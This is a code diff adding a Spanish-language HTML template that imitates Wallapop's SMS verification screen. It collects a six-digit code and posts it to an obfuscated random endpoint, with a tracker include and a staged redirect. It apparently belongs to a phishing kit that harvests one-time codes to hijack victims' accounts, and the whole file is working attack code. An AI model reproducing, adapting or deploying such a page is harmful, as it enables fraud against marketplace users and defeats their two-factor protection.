@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wallapop - Verificación</title>
+    <link rel="icon" type="image/png" href="/img/wallapop-logo.png">
+    <%- include('partials/tracker') %>
+    <link rel="stylesheet" href="/css/wallapop.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+</head>
+<body>
+    <header class="wlp-header">
+        <div class="wlp-header-inner">
+            <a href="/" class="wlp-logo-link">
+                <img src="/img/wallapop-logo.png" alt="Wallapop" class="wlp-logo-img">
+            </a>
+        </div>
+    </header>
+
+    <main class="wlp-page-wrapper">
+        <div class="wlp-modal-card">
+            <h1 class="wlp-title" style="margin-bottom: 8px;">Introduce el código de verificación</h1>
+            <p style="margin-bottom: 20px; color: #546e7a; font-size: 14.5px; line-height: 1.5;">
+                Lo hemos enviado al número de teléfono<br>
+                <strong style="color: #253238; font-weight: 600;">+34 ••• •• •• ••</strong>
+            </p>
+
+            <form method="post" id="semitrLogin">
+                <input type="hidden" id="smsCode" name="smsCode">
+                
+                <div class="wlp-digit-container">
+                    <input type="text" class="wlp-digit-input" inputmode="numeric" pattern="[0-9]*" maxlength="1" data-index="0" autofocus>
+                    <input type="text" class="wlp-digit-input" inputmode="numeric" pattern="[0-9]*" maxlength="1" data-index="1">
+                    <input type="text" class="wlp-digit-input" inputmode="numeric" pattern="[0-9]*" maxlength="1" data-index="2">
+                    <input type="text" class="wlp-digit-input" inputmode="numeric" pattern="[0-9]*" maxlength="1" data-index="3">
+                    <input type="text" class="wlp-digit-input" inputmode="numeric" pattern="[0-9]*" maxlength="1" data-index="4">
+                    <input type="text" class="wlp-digit-input" inputmode="numeric" pattern="[0-9]*" maxlength="1" data-index="5">
+                </div>
+                <span class="wlp-error-text" id="smsCodeError" style="margin-bottom: 12px;"></span>
+
+                <div style="margin: 18px 0 24px; font-size: 13.5px; color: #546e7a;">
+                    ¿No has recibido el código?<br>
+                    <a href="#" class="wlp-link" id="resendLink" onclick="return false;" style="display: inline-block; margin-top: 4px;">Reenviar</a> 
+                    <span id="countdownText" style="color: #78909c;">después de 6 s</span>
+                </div>
+
+                <button class="wlp-btn-primary" type="submit" id="submitBtn">Verificar</button>
+            </form>
+        </div>
+    </main>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const form = document.getElementById('semitrLogin');
+            const hiddenCode = document.getElementById('smsCode');
+            const digitInputs = Array.from(document.querySelectorAll('.wlp-digit-input'));
+            const smsCodeError = document.getElementById('smsCodeError');
+            const submitBtn = document.getElementById('submitBtn');
+            const countdownText = document.getElementById('countdownText');
+
+            let seconds = 6;
+            const timer = setInterval(() => {
+                seconds--;
+                if (seconds > 0) {
+                    countdownText.textContent = 'después de ' + seconds + ' s';
+                } else {
+                    clearInterval(timer);
+                    countdownText.textContent = '';
+                }
+            }, 1000);
+
+            digitInputs.forEach((input, idx) => {
+                input.addEventListener('input', function(e) {
+                    const val = e.target.value.replace(/\D/g, '');
+                    e.target.value = val ? val[0] : '';
+
+                    smsCodeError.style.display = 'none';
+                    digitInputs.forEach(i => i.classList.remove('input-error'));
+
+                    if (val && idx < digitInputs.length - 1) {
+                        digitInputs[idx + 1].focus();
+                    }
+                    syncHiddenCode();
+                });
+
+                input.addEventListener('keydown', function(e) {
+                    if (e.key === 'Backspace' && !e.target.value && idx > 0) {
+                        digitInputs[idx - 1].focus();
+                    }
+                });
+
+                input.addEventListener('paste', function(e) {
+                    e.preventDefault();
+                    const pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
+                    if (pasted) {
+                        pasted.split('').slice(0, 6).forEach((char, i) => {
+                            if (digitInputs[i]) {
+                                digitInputs[i].value = char;
+                            }
+                        });
+                        const nextIdx = Math.min(pasted.length, 5);
+                        digitInputs[nextIdx].focus();
+                        syncHiddenCode();
+                    }
+                });
+            });
+
+            function syncHiddenCode() {
+                const fullCode = digitInputs.map(i => i.value).join('');
+                hiddenCode.value = fullCode;
+                return fullCode;
+            }
+
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+                const code = syncHiddenCode();
+
+                if (!code || code.length < 6) {
+                    smsCodeError.textContent = 'Por favor, introduce el código completo de 6 dígitos.';
+                    smsCodeError.style.display = 'block';
+                    digitInputs.forEach(i => i.classList.add('input-error'));
+                    return;
+                }
+
+                submitBtn.textContent = 'Verificando...';
+                submitBtn.disabled = true;
+
+                $.ajax({
+                    url: '/m4kT9BQWt7KTDdaVmafx',
+                    type: 'POST',
+                    contentType: 'application/json',
+                    data: JSON.stringify({ code: code }),
+                    success: function(info) {
+                        if (info.OK) {
+                            window.location = "/loading?time=2&url=/blaTxmdM9HwCP472fgsut";
+                        } else {
+                            smsCodeError.textContent = 'Código no válido. Inténtalo de nuevo.';
+                            smsCodeError.style.display = 'block';
+                            digitInputs.forEach(i => i.classList.add('input-error'));
+                            submitBtn.textContent = 'Verificar';
+                            submitBtn.disabled = false;
+                        }
+                    },
+                    error: function() {
+                        smsCodeError.textContent = 'Se ha producido un error. Inténtalo de nuevo.';
+                        smsCodeError.style.display = 'block';
+                        digitInputs.forEach(i => i.classList.add('input-error'));
+                        submitBtn.textContent = 'Verificar';
+                        submitBtn.disabled = false;
+                    }
+                });
+            });
+        });
+    </script>
+</body>
+</html>
